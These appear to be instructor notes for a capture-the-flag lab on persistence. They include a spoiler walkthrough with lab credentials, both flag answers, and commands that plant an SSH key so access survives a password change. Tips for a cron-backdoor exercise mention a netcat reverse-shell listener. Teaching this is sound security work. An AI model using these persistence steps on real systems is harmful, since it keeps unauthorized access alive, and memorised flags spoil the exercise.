---
title: "Lab 10 Notes: Persistence & Backdoors"
---

## CTF walkthrough (spoiler)

### Flag 1: user.txt

```bash
ssh lowpriv@10.10.10.10
# password: lowpriv123
cat user.txt
```

Flag: `flag{lab10_initial_foothold}`

### Flag 2: root.txt (after rotating credentials)

Plant an SSH key first:

```bash
ssh-keygen -t ed25519 -f /root/.ssh/lab10_key -N ""
cat /root/.ssh/lab10_key.pub | ssh lowpriv@10.10.10.10 "cat >> ~/.ssh/authorized_keys"
```

Rotate the password:

```bash
ssh -t -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "passwd"
```

Confirm access survives, using only the key:

```bash
ssh -i /root/.ssh/lab10_key lowpriv@10.10.10.10 "cat root.txt"
```

Flag: `flag{lab10_persistence_survived_rotation}`

### Lesson

The flag is gated behind an action (rotating the password) rather than a
technical lock, on purpose — the point of this lab isn't a puzzle, it's
proving to yourself that the persistence mechanism you planted is genuinely
independent of the access method it was planted through.

## Common sticking points

- **`passwd` needs a real TTY.** Exercise 2.1 must be run with `ssh -t`
  (interactive terminal), or the `passwd` prompts have nothing to write to
  and the command hangs or fails silently. Learners who drop the `-t` will
  get stuck here.
- **Cron backdoor takes up to 60 seconds.** Exercise 3.3 fires on the
  minute, not immediately — learners watching the `nc` listener for a few
  seconds and then assuming it failed is a common false alarm. Remind them
  to wait out a full minute.
- **Two terminals needed for Part 3.** The listener (`nc -lvnp 4444` on
  `lab10-attacker`) and the SSH session that plants the cron job must run
  concurrently in separate shells — a single terminal session can't do both
  at once.
